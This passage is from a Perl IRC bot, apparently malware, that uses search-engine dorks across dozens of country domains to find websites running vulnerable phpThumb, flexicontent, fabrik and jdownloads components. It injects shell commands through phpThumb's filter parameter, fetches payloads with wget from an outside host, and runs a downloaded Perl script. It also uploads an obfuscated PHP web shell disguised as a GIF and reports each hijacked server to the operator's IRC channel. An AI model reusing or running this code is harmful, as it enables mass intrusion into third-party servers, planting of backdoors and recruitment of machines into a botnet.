		my $website = "http://".$site."/components/com_flexicontent/librairies/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; $shell ; &phpThumbDebug=9";
		my $request = $agent->request(HTTP::Request->new(GET=>$website));		
		my $cwebsite = "http://".$site."/components/com_flexicontent/librairies/phpthumb/myluph.jpg"; 
		my $creq = $agent->request(HTTP::Request->new(GET=>$cwebsite));
		if ($creq->is_success) {
		my $mvwebsite = "http://".$site."components/com_flexicontent/librairies/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; mv myluph.jpg myluph.php ; &phpThumbDebug=9";
 		my $mvreq = $agent->request(HTTP::Request->new(GET=>$mvwebsite));
 		my $xmlrpc = "http://".$site."components/com_flexicontent/librairies/phpthumb/myluph.php";
 		my $c2req = $agent->request(HTTP::Request->new(GET=>$xmlrpc));
 		my $check = &get_content($xmlrpc); &get_content($spx); &get_content($bot); &get_content($box); &get_content($box); &get_content($box); sleep(2);
 		if ($check =~ /GIF89a/) { 
		&get_content($xmlrpc);
		my $safe = ""; my $os = ""; my $uid = "";
		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
 		&msg("$admin","$flelogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$nick","$flelogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$channel","$flelogo15(7@2$engine15)(7@2SheLL15)3 Target Sent To $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 			}
 		}
 	}
}
}

sub fab_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$logo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","15(7@2$engine15)14 Scan finish"); }
		my $test = "http://".$site.$bug;
		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
		my $xmlrpc = "http://".$site."media/myluph.PhP.pjpeg";
		my $blackunix = "http://".$site."logs/myluph.PhP.pjpeg";
		my $box = "http://".$site."media/dlc.php";
		my $cz  = &get_content($box); {
		my $bogex = "http://www.mammaecologica.com/media/catalog/product/n/fabrik.php?url=".$site;
		&get_content($bogex); sleep(1);
		my $check = &get_content($xmlrpc."?220"); 
		if ($check =~ /GIF89a/){
		my $safe = "";
 		my $os = "";
 		my $uid = "";
		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
		my $chmod = &get_content($blackunix);sleep(1);
		if ($chmod =~ /GIF89a/){
		&msg("$admin","$fablogo15,1[15@4$engine15][15@4SheLL15]9 ".$blackunix." 15,1[15@4$os15][15@4safemode 7:4 $safe15]");
		&msg("$nick","$fablogo15,1[15@4$engine15][15@4SheLL15]9 ".$blackunix." 15,1[15@4$os15][15@4safemode 7:4 $safe15]");
		&msg("$channel","15(7@2$engine15)9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");
		} else {
		&msg("$admin","$fablogo15,1[15@4$engine15][15@4SheLL15]9 ".$xmlrpc." 15,1[15@4$os15][15@4safemode 7:4 $safe15]");
		&msg("$nick","$fablogo15,1[15@4$engine15][15@4SheLL15]9 ".$xmlrpc." 15,1[15@4$os15][15@4safemode 7:4 $safe15]");
		&msg("$channel","15(7@2$engine15)9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");
		}
	}
}
 			} exit; }
		}
	}
}

sub jdl_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$jdllogo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","$jdllogo15(7@2$engine15)14 Scan finish"); }
		my $test = "http://".$site.$bug;
		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
		my $xmlrpc = "http://".$site."images/jdownloads/screenshots/myluph.php.j";
		my $blackunix = "http://".$site."logs/myluph.php";
		my $bot = "http://".$site."images/jdownloads/screenshots/metri.php";
		my $box = "http://".$site."images/jdownloads/screenshots/recky.php";
		my $cz  = &get_content($test); sleep(3);
		if ($cz =~ /This form allows/i){
		my $bogex = $file."?url=".$site;
		&get_content($bogex); sleep(3);
		my $check = &get_content($xmlrpc."?clone"); &get_content($box); &get_content($bot); &get_content($bot); 
		if ($check =~ /GIF89a/i){
		&get_content($xmlrpc);
		my $safe = ""; my $os = ""; my $uid = "";
		my $ftphost = "";
 		my $ftpuser = "";
 		my $ftppass = "";
 		my $ftpopen = "";
		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
		my $chmod = &get_content($blackunix);sleep(1);
		if ($chmod =~ /GIF89a/i){
		&msg("$admin","$jdllogo15(7@2$engine15)(7@2SheLL15)3 ".$blackunix." 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
		&msg("$nick","$jdllogo15(7@2$engine15)(7@2SheLL15)3 ".$blackunix." 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
		&msg("$channel","$jdllogo15(7@2$engine15)(7@2SheLL15)3 Target Sent to $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
		} else {
		&msg("$admin","$jdllogo15(7@2$engine15)(7@2SheLL15)3 ".$xmlrpc." 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
		&msg("$nick","$jdllogo15(7@2$engine15)(7@2SheLL15)3 ".$xmlrpc." 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
		&msg("$channel","$jdllogo15(7@2$engine15)(7@2SheLL15)3 Target Sent to $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
		}
	}
}
 			} exit; }
    		}
    	}
}

sub php_xpl() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$logo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","15(7@2$engine15)14 Scan finish"); }
		        my $target = "http://".$site.$bug;
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
			my $dor = "?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg;wget%20http://djcaa.org/wp-admin/includes/arkano.aff%20-O%20libs.php;&phpThumbDebug=9";
			my $open = "?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg;lwp-download%20http://djcaa.org/wp-admin/includes/arkano.aff%20;mv%20arkano.aff%20libs.php;&phpThumbDebug=9";
			my $explo = "http://".$site."phpThumb.php".$dor;
			my $explo2 = "http://".$site."phpThumb/phpThumb.php".$dor;
			my $openx = "http://".$site."phpThumb.php".$open;
			my $openxx = "http://".$site."phpThumb/phpThumb.php".$open;
			&get_content($explo);
			&get_content($explo2);
			&get_content($openx);
			&get_content($openxx);
			my $shell = "http://".$site."/libs.php";
			my $shell2 = "http://".$site."/phpThumb/libs.php";
			&get_content($shell."?220");
			my $check = &get_content($shell."?220"); 
			if ($check =~ /GIF89a/){
			my $safe = ""; 
 			my $os = ""; 
 			my $uid = "";
			if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
			if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
			if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
			&msg("$channel","15(7@2$engine15)(7@2SheLL15)3 Target Sent to $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
			&msg("$admin","$allogo5[4-5=4[8$engine4]5=4-5] 4 $shell 14[3$os14][3safemode10:3$safe14]"); sleep(5);
			}
			my $check2 = &get_content($shell2."?220");
			&get_content($shell2."?220");
			if ($check2 =~ /GIF89a/){
			my $safe = ""; 
 			my $os = ""; 
 			my $uid = "";
			if ($check2 =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
			if ($check2 =~ /Uname : (.*?)<\/b>/){$os=$1;}
			if ($check2 =~ /uid=(.*?)gid=/){$uid=$1;}
			&msg("$channel","15(7@2$engine15)(7@2SheLL15)3 Target Sent to $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
			&msg("$admin","$allogo5[4-5=4[8$engine4]5=4-5] 4 $shell2 14[3$os14][3safemode10:3$safe14]"); sleep(5);
		}
			&shellx1x($chan,$site,$engine,$nick,$logo);
		} exit; }
	}
}
}
sub shellx1x() {
	my $chan	= $_[0];
	my $site	= $_[1];
	my $engine	= $_[2];
	my $nick	= $_[3];
	my $logo    = $_[4];
	my $crota = "http://".$site."/phpThumb/dlc.php";
	my $crotb = "http://".$site."/dlc.php";
	&postx("http://".$site,'system("wget http://djcaa.org/wp-admin/includes/arkano.aff -q -O ../dlc.php);');
	my $html = &get_content($crota."?220=cd%20/tmp%20;wget%20http://djcaa.org/wp-admin/includes/docx.txt%20;%20perl%20docx.txt%20;%20rm%20-rf%20doc*");
	my $html2 = &get_content($crotb."?220=cd%20/tmp%20;wget%20http://djcaa.org/wp-admin/includes/docx.txt%20;%20perl%20docx.txt%20;%20rm%20-rf%20doc*");

	if ($html =~ /GIF89a/) {
	&get_content($crota); sleep(3);
	my $safe = ""; my $os = ""; my $uid = "";
		if ($html =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($html =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($html =~ /uid=(.*?)gid=/){$uid=$1;}
			&msg("$channel","15(7@2$engine15)(7@2SheLL15)3 Target Sent to $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
		&msg("$admin","15$engine3 [Success]9 $crota 15(OS=$os) uid=$uid "); sleep(2);
		}
    if ($html2 =~ /GIF89a/) {
	&get_content($crotb);
	my $safe = ""; my $os = ""; my $uid = "";
		if ($html2 =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($html2 =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($html2 =~ /uid=(.*?)gid=/){$uid=$1;}
			&msg("$admin","15$engine9 $crotb 15(OS=$os) uid=$uid"); sleep(2);
			&msg("$channel","15(7@2$engine15)(7@2SheLL15)3 Target Sent to $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15) ");
	}
	
}

sub postx() {
	my $target = $_[0];
	my $code = "R0lGODlhPD9waHANCmV2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoc3RycmV2KHN0cl9yb3QxMygnPThUK3RQVE5xOE5COEhSbVVSZkxzL1FoMWVJWkRlTWVhc1hmVjZDUUx1UDVFZWxsRHZxSmJrN0x4eGZXRncwYWloKy84MUhzV3JFcERlYnM5b2p4VytyQm1NVjB0K0Z0bjIxVE9TcUxOSXZBNURQQjdnemlOZkRuSnRaRnNKWW9CUDVVMjRNRFROKytZYnFtQVEvR3pkdVBtalVPTkpBWVNWMFZrUFZlM0RTR0x6ZGI2ZFdPK2dkZmE0cVFabk5BVHBqa1pTVEQ4Y1M2MFcvSHk5a2xmeHRTUkpiRmpjWmg0L3VEaHUyanRwK3VNL1huQXhLN2RGOWE2QitPbWJNTXdtSS9lWkp0cEtTOUNDTkMrQnZhSWRnYTJramhnZGNhMC9VSGNhcmdYSlhwNG1Ea0gzT0Jsalg5ZVkrOEthcEdsSm82R0szZDZzS0JiNXpHS2gwWDNoMmRRZEhuL2tjb24xaFFkTktORy8xR0JjMzVaalhjSkNlRkJpeWdWN3BRbEtjZzhiV3RLQ2tvaFdleGU2SXk3RW0zSTRIMjQvUVIwQy95M2VuWjgxOUxwbTVXZmZYblZCU3lDL1JndVVsTml2Q1M5b04wSHJkRW5JWWxqeFJXdUM5ZmRwZG81RXMyMW9nbnNPM3Bja0wxbDRhbjErTW1CTWxjSS9YdkZqQjc1ZGY3QW02ZWdJcW85ektsd1BxSTI5MEhaSmUyMU9JNnlCU3FENzc4bi9ES3Vwbktwc0x2R3JsbEFLbVVDeEpDK0M4ZTNnZElnN0dUSG1DSThmb1NsbWppcDBHWHhFK3lMclJMbnNuVEtCbkptcnAxWGRlRlVwaE1ldXhtaEtBWXBySmNlcjcybWNkVkd5emUvMW9BMEhzQjdtck1WRWM5Rno1NnhHVDg5M2Fweit0Y1VyajM2MTNFY3I2SmIxMHBuM2g2SGFkZlpzOU1rY1lJN0tnYzFONUQ3S1RYK3B6TXBybEZJM1V3dFg3enl6SWFnckZzVEh1Q20ya3Vzcm1DY25xOFFNOGMvcnBNWm1nKzYxVWNVM2RkQUVsNjJqSW42SWNwMmFuemliK215amYwb1orQ2dVNy9VeWdSc0RpbytYQXFvMzRZQTJ2SjNlemNyNjhKY0RrYy9yd3AwVExzbzhUMm5sQTlZM2VVejNrRzE3c3haUHNsb3M1MDdpQkJEV1NqL3FVTU1YbGorRE5QbTUrdVh2V2laWHlhNUhxdDdYcGlpR09hRjV4VitwSEFjVVZwZ0hVb3czc3dyTGRsSW1LWU1zSG56djJlZGI3V2tTSDBJTTl0KzQ4alhmQnFtOTRUNFMxYVFrNTVyT3VEK1FhemNvZUJpTnNjbURTckhkRTJ4Q1VBQWNFSkVmT0VDS0puUldoZmdsMEE2dHBBSlVMVjVsY3FLMnlDVFlGSEI2Z1VaVWxxQVBKa0pMcVFPRmFvNnF6aGNZTmJPMFdha0RZMVdBUFV2dVhhRTZ2NUhDUkVDSkVXRnR4NW8zTzJMNEtod0lKZmM1ZFBITFhmMjFPcVhKQkR2cXpSL3FFRDFtbkdGaFFMaFJwWTdRV3B4UmlmQ05BSlBkTXg5U1hFYVJpSjhqVUZUUkVTWnZvYUNVbERlbG9EYXhyUkIwVm9sdE91MjNKdEVEdVdvN2ZhZXVKcjMvZ3JLZkR0WEVMcWRsa1QzOFBJOWZzeWNhcWVVTWZTdTNFRWt0VjA4bFFLL3dEanYva1B2N1BnTGFtYjh2dWZoNEZXc2tJVXpub1JLU2pBM3RKMVBsTWVNclM2ci93V1dmdHYzYkRwZzFhQUJzSGorMEkwT1lHQ0JqQ1Rnc1ZWdksxcDNTUlRiTFNOTXBERWwzdm05b1JKdmt6VUNvWmxTL1JIK2pBNnBIUmpBeGc5b2pUU01JUVM0TzBwK21LdlBUdjljM3laMG1oUDYzdHVSeVdEc0ZGOGMzUHkyZ094U2lIZXUydzRJbVE3WjIwUnhvU09NTTAvWWhxaFJKaGlXRGJHWVppdlNRQkl0czBTZTFyQXc2VEphSkU2VHhRZUlXeXZMOXZqNVZQNjM5QUR0am55ZER5dWV1WWhNd3o3UFFyRFlpWHhUb09WYmpLVHZnalFraFNhZm5POUVnNlREZVBjTmVNS2tVZEJvVUNWcEFid1BhSEMwdXBvWFpkeVRQL3BNQWVOSVBWL1lQS3ZJYzZ2LzlIYkdBR2s2YlNlUFFWWEplaDVHYllYSHF4eVZOOGJRYVFoVEFwQmt6WnlPOWdWcElIeGkyQUlxUms1V0ljTFR0UE82RHVOV28rVlVscEluUzlWdVhRWlVRNXVpTlJXZWtodVZCbFQrMlFycGZrNGhqaG84TGJHUk5OM0tJTkJiZU1GQmZrMGZtdHFUbHBhTlJnVCtjV2toRzdwYnNUMm44RktnUW5uelFxaHNqSHp6dnBGb05YUnNtc1BMRy9Wd2tGdkZxbFEwYVhrd1BvSGpkUHd2ek1jK2xicCt5VjZFSjgrUFloaGZ4VjRNbkswZmZ4ejdBNkh6NEFUM241MHhZSmhIWUJEa1pLbFVaQkNyYnpXYk9VOUNIWk1laWsxaDFIaEt6UkJISFQ5UXE1U3ZzaE51NzJxdnBoeUxWYitSNTFEU3E5SHlXL0M4cVNVWE5vSkZIazVTRTY3WUwxMHhKS2drWHRBU0tMc0pIdkZJNjExZ2dodEhwOXNESEZ4Ly8yZ0RpcGhIQlh4end5SWdWQmwxSmZiWE9Gb3JoN1RCZ1BXR1RZSk9RNzBYc3QxbDBOSnBTNndEUHVPRzB2Z0ttRVN4d0tFU0hkUmt0ckI4QVdTUG45UUpUMEQwdTBNWDJHR2s2Znk4OGJIYkVCSmpMUHh4OTdNVG5yb0d2V2VubE84Z2tQSUpSK215QnlOeHN4Zzc0dCt6Z2Y5aHRha1puUkttUmxmSTMxTUJUU3BpRDB0VllpTjQ0R3U0dS92NUpyTEtCcnhrZ2JiSkZnYi9GemRHdE95VHdiNkp4YzZrUmdVZ0ZDZ1UwUXFLTXVnMG81aStrSWhsY0xoaWtjL3VPZmdhcU43K2ZFVkF1dnp2emh1d2hFV1RTRGtGcHZGNXJNWTlpb2pjWE1FRHY3ZXV0OFViS0VjWFZ4Zmh0cWs2Q05rcGtjWEE0cG1URHNWeW5peU5XU3I0ZHo0cDV2NXZTWXQyMDgzQmlxWC9DaWdDL0o3YzNXdXRUeXdUTU42UTJWdklEVkZKU01Zay9PUGtDbDU4Z0wybTYwYjZFbVcveWVNZXpvUUZCcmZGRnR0UnFQcXdYMGdkSzFUSTNlR3llWUVsZVU4SitwR1pWME5qUFdwY3F2N2dvWFR3U2k4dDRDUjFsVkd5WjFVMHZSQWprWXRpWXRHaktVZFZ4dWlFUitTY240cnZjaFMxYWtpRUhwNURMZVY0VS81bmdoZDZUdlc2aUhidjJrUktTUTNqbEZwTDRycWw0U1N1WHcrRzZHckdUWjFSbWdiRVlQNnFaTkpDTTJoUkozTmlHM1VwenY0d09iUHBPdUJoNm55cmppUnVMREtwSFVScFVDMzBJOUVOc09vZ0xlUTNiU0w5M0wwM1FoNWo2Z2t6RjA4S0RSbW8ydjRvU09UblZ6cmJkdklidWhOS2NjN1pYRmRQRTk1a01HcmYwa2Frak5MeW5WcDBQRnhUQ1NxQkpQUEV3TkF0RDhZRW90WkdMZ1BWZGhxUVgremRsajNPMXBBWDZYYmJNZXpmM1NwVnpHNTJSUVg2MWMrQTJCMCsyQlBpVVpna2FMOHFyaVVxZU0xbnA5ZW55N0s2cEVoRkdrOVp0SytZbWRSTnZYaGFNZEZ2bXVFYlcrN3RsUWFGbU1Ga0MyVnNna0FnaHFicWdMeHVjQ1hvV2JWSTFzUmM0VVIzRXpZbUNqaXp4dCtTZkF5UjBDRWhlOHRxMzk5TVAyck4vUjl0M1Uyb1Q2aEdBMHF1VnYvRDJjZlB5dEJzdzJsaUdCcDl5amsvaWlESnVaUkdwQ1IvUEU2MEdDcUFXU0pVKzJ1aTlDdCtDYzlpYnE0b3cvbTl5TDJVaGwveFI2M3BZNWF3MW5mRzlBTUhnc1FnVmJ3bVFsY3NhYmlzMFlDc2JhT2o3UzF0M1lhNnFsYlV2QnlORXVMdktxWXRDZ1Jib1lyTWRqR1VqbWJQejQxQWZidU1GbHF0Y1dDMFZ4dGFCNnQ3WXFDckJKamIwRmxOV0pBTXc0UVdBb0NPdDFVY3dJUVNlOXpIK1JoLy9WKzVDcnR4a2R3QzhqQ2tCMjN2NGNFK0ZpWGJUQTZxQ2J3eVZPdnpIcVlJS0k5SXVIUDZSdy9NemNXVG1veWhvbmx6VXQ1MW5yNlNoNERlcUVKcWtsd0J6SFpBNkFZaVpQVHFYYk9xR0JPMmlnY3dUM0dBNGlSTGdnSWN3SW0nKSkpKSk7DQo/Pg==";
	my $browser = LWP::UserAgent->new;
	my $res = $browser->post($target."./dlc.php",['dlc.php'=> $code => 'application/octet-stream'],'Content-type'=>'form-data');
	my $hasil = $res->content;
	return $hasil;
}

#########################################	Searching site...

sub search_engine() {
    my (@total,@clean);
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $logo = $_[4];
 	if ($engine eq "aanK") { my @aank = &jack21($dork); push(@total,@aank);sleep(3); }

    if ($engine eq "coi") { my @coi = &jack22($dork); push(@total,@coi);sleep(3); }

    if ($engine eq "roin") { my @roin = &jack23($dork); push(@total,@roin);sleep(3); }

    if ($engine eq "Keren") { my @keren = &jack24($dork); push(@total,@keren);sleep(3);}

    if ($engine eq "Beken") { my @beken = &jack25($dork); push(@total,@beken);sleep(3);}

    if ($engine eq "kangkung") { my @kangkung = &jack26($dork); push(@total,@kangkung);sleep(3);}

    if ($engine eq "successor") { my @successor = &jack27($dork); push(@total,@successor);sleep(3);}

    if ($engine eq "Brewok") { my @brewok = &jack28($dork); push(@total,@brewok);sleep(3);}

    if ($engine eq "Marlboro") { my @marlboro = &jack29($dork); push(@total,@marlboro);sleep(3);}

    if ($engine eq "Prince") { my @prince = &jack30($dork); push(@total,@prince);sleep(3);}

    if ($engine eq "UAE") { my @uae = &jack1($dork."+site:ae"); push(@total,@uae);sleep(3); }

    if ($engine eq "Myanmar") { my @myanmar = &jack2($dork."+site:mm"); push(@total,@myanmar);sleep(3); }

    if ($engine eq "Argentina") { my @argentina = &jack3($dork."+site:ar"); push(@total,@argentina);sleep(3); }

    if ($engine eq "Austria") { my @austria = &jack4($dork."+site:mt"); push(@total,@austria);sleep(3); }

    if ($engine eq "Australia") { my @australia = &jack5($dork."+site:au"); push(@total,@australia);sleep(3); }

    if ($engine eq "Brazil") { my @brazil = &jack6($dork."+site:br"); push(@total,@brazil);sleep(3); }

    if ($engine eq "Canada") { my @canada = &jack7($dork."+site:ca"); push(@total,@canada);sleep(3); }

    if ($engine eq "Chili") { my @chili = &jack8($dork."+site:cl"); push(@total,@chili);sleep(3); }

    if ($engine eq "Cina") { my @cina = &jack9($dork."+site:cn"); push(@total,@cina);sleep(3); }

    if ($engine eq "CoMersil") { my @comersil = &jack10($dork."+site:com"); push(@total,@comersil);sleep(3); }

    if ($engine eq "Czech") { my @czech = &jack11($dork."+site:cz"); push(@total,@czech);sleep(3); }

    if ($engine eq "Germany") { my @germany = &jack12($dork."+site:de"); push(@total,@germany);sleep(3); }

    if ($engine eq "Denmark") { my @denmark = &jack13($dork."+site:dk"); push(@total,@denmark);sleep(3); }

    if ($engine eq "Spain") { my @spain = &jack14($dork."+site:es"); push(@total,@spain);sleep(3);sleep(3); }

    if ($engine eq "Europe") { my @europe = &jack15($dork."+site:eu"); push(@total,@europe);sleep(3); }

    if ($engine eq "France") { my @france = &jack16($dork."+site:fr"); push(@total,@france);sleep(3); }

    if ($engine eq "Hungary") { my @hungary = &jack17($dork."+site:hu"); push(@total,@hungary);sleep(3);sleep(3); }

    if ($engine eq "Indonesia") { my @indonesia = &jack18($dork."+site:id"); push(@total,@indonesia);sleep(3); }

    if ($engine eq "Israel") { my @israel = &jack19($dork."+site:il"); push(@total,@israel);sleep(3); }

    if ($engine eq "India") { my @india = &jack20($dork."+site:in"); push(@total,@india);sleep(3); }

    if ($engine eq "Info") { my @info = &jack1($dork."+site:info"); push(@total,@info);sleep(3); }

    if ($engine eq "Iran") { my @iran = &jack2($dork."+site:ir"); push(@total,@iran);sleep(3); }

    if ($engine eq "Italy") { my @italy = &jack3($dork."+site:it"); push(@total,@italy);sleep(3); }

    if ($engine eq "Japan") { my @japan = &jack4($dork."+site:jp"); push(@total,@japan);sleep(3); }

    if ($engine eq "Korea") { my @korea = &jack5($dork."+site:kr"); push(@total,@korea);sleep(3); }

    if ($engine eq "Mexico") { my @mexico = &jack6($dork."+site:mx"); push(@total,@mexico);sleep(3); }

    if ($engine eq "Malaysia") { my @malaysia = &jack7($dork."+site:my"); push(@total,@malaysia);sleep(3); }

    if ($engine eq "Network") { my @network = &jack8($dork."+site:net"); push(@total,@network);sleep(3); }

    if ($engine eq "Netherlands") { my @netherlands = &jack9($dork."+site:nl"); push(@total,@netherlands); }

    if ($engine eq "Organization") { my @organization = &jack10($dork."+site:org"); push(@total,@organization);sleep(3); }

    if ($engine eq "Philippines") { my @philippines = &jack11($dork."+site:ph"); push(@total,@philippines);sleep(3); }

    if ($engine eq "Poland") { my @poland = &jack12($dork."+site:pl"); push(@total,@poland);sleep(3); }

    if ($engine eq "Romania") { my @romania = &jack13($dork."+site:ro"); push(@total,@romania);sleep(3); }

    if ($engine eq "Russian") { my @russian = &jack14($dork."+site:ru"); push(@total,@russian);sleep(3); }

    if ($engine eq "Thailand") { my @thailand = &jack14($dork."+site:th"); push(@total,@thailand);sleep(3); }

    if ($engine eq "Ukraine") { my @ukraine = &jack16($dork."+site:ua"); push(@total,@ukraine);sleep(3); }

    if ($engine eq "England") { my @england = &jack17($dork."+site:uk"); push(@total,@england);sleep(3); }

    if ($engine eq "USA") { my @usa = &jack18($dork."+site:us"); push(@total,@usa);sleep(3); }

    if ($engine eq "Slovenia") { my @slovenia = &jack19($dork."+site:si"); push(@total,@slovenia);sleep(3); }

    if ($engine eq "Belgium") { my @belgium = &jack20($dork."+site:be"); push(@total,@belgium);sleep(3); }

    if ($engine eq "Bussines") { my @bussines = &jack1($dork."+site:bi"); push(@total,@bussines);sleep(3); }            

    if ($engine eq "SouthAfrica") { my @southafrica = &jack2($dork."+site:co.za"); push(@total,@southafrica); }

    if ($engine eq "Vietnam") { my @vietnam = &jack3($dork."+site:com.vn"); push(@total,@vietnam);sleep(3); }

    if ($engine eq "Tuvalu") { my @tuvalu = &jack4($dork."+site:tt"); push(@total,@tuvalu);sleep(3); }

    if ($engine eq "Cocos") { my @cocos = &jack5($dork."+site:cc"); push(@total,@cocos);sleep(3); }

    if ($engine eq "Turky") { my @turky = &jack6($dork."+site:tr"); push(@total,@turky);sleep(3); }

    if ($engine eq "Asia") { my @asia = &jack7($dork."+site:asia"); push(@total,@asia);sleep(3); }

    if ($engine eq "Serbia") { my @serbia = &jack8($dork."+site:rs"); push(@total,@serbia);sleep(3); }

    if ($engine eq "Singapore") { my @singapore = &jack9($dork."+site:sg"); push(@total,@singapore);sleep(3); }

    if ($engine eq "Taiwan") { my @taiwan = &jack10($dork."+site:tw"); push(@total,@taiwan);sleep(3);}

    if ($engine eq "Sweden") { my @sweden = &jack11($dork."+site:se"); push(@total,@sweden);sleep(3); }

    if ($engine eq "Pakistan") { my @pakistan = &jack12($dork."+site:pk"); push(@total,@pakistan);sleep(3); }

    if ($engine eq "Norway") { my @normay = &jack13($dork."+site:no"); push(@total,@norway);sleep(3); }

    if ($engine eq "Montenegro") { my @montenegro = &jack14($dork."+site:me"); push(@total,@montenegro);sleep(3); }      

    if ($engine eq "Greece") { my @greece = &jack15($dork."+site:gr"); push(@total,@greece);sleep(3);sleep(3);}

    if ($engine eq "Education") { my @education = &jack16($dork."+site:edu"); push(@total,@education);sleep(3);}

    if ($engine eq "Goverment") { my @goverment = &jack17($dork."+site:gov"); push(@total,@goverment);sleep(3); }

    if ($engine eq "Kazakhstan") { my @kazakhstan = &jack18($dork."+site:kz"); push(@total,@kazakhstan);sleep(3); }

    if ($engine eq "Afganistan") { my @afganistan = &jack19($dork."+site:af"); push(@total,@afganistan);sleep(3); }

    if ($engine eq "Albania") { my @albania = &jack20($dork."+site:al"); push(@total,@albania);sleep(3); }

    if ($engine eq "Algeria") { my @algeria = &jack1($dork."+site:dz"); push(@total,@algeria);sleep(3); }

    if ($engine eq "Angola") { my @angola = &jack2($dork."+site:ao"); push(@total,@angola);sleep(3); }

    if ($engine eq "Armenia") { my @armenia = &jack3($dork."+site:am"); push(@total,@armenia);sleep(3); }

    if ($engine eq "Azerbaijan") { my @azerbaijan = &jack4($dork."+site:az"); push(@total,@azerbaijan);sleep(3); }

    if ($engine eq "Bahrain") { my @bahrain = &jack5($dork."+site:bh"); push(@total,@bahrain);sleep(3); }

    if ($engine eq "Bangladesh") { my @bangladesh = &jack6($dork."+site:bd"); push(@total,@bangladesh);sleep(3); }

    if ($engine eq "Belarus") { my @belarus = &jack7($dork."+site:by"); push(@total,@belarus);sleep(3); }

    if ($engine eq "Bhutan") { my @bhutan = &jack8($dork."+site:bt"); push(@total,@bhutan);sleep(3); }

    if ($engine eq "Bolivia") { my @bolivia = &jack9($dork."+site:bo"); push(@total,@bolivia);sleep(3); }

    if ($engine eq "Bosnia") { my @bosnia = &jack10($dork."+site:ba"); push(@total,@bosnia);sleep(3); }

    if ($engine eq "Bulgaria") { my @bulgaria = &jack12($dork."+site:bg"); push(@total,@bulgaria);sleep(3); }

    if ($engine eq "Brunei") { my @brunei = &jack13($dork."+site:bn"); push(@total,@brunei);sleep(3); }

    if ($engine eq "Cambodia") { my @cambodia = &jack14($dork."+site:kh"); push(@total,@cambodia);sleep(3); }

    if ($engine eq "Cameroon") { my @cameroon = &jack11($dork."+site:cm"); push(@total,@cameroon);sleep(3); }

    if ($engine eq "Christmas") { my @christmas = &jack15($dork."+site:cx"); push(@total,@christmas);sleep(3); }

    if ($engine eq "CostaRika") { my @costarika = &jack16($dork."+site:cr"); push(@total,@costarika);sleep(3); }

    if ($engine eq "Croatia") { my @croatia = &jack17($dork."+site:hr"); push(@total,@croatia);sleep(3); }

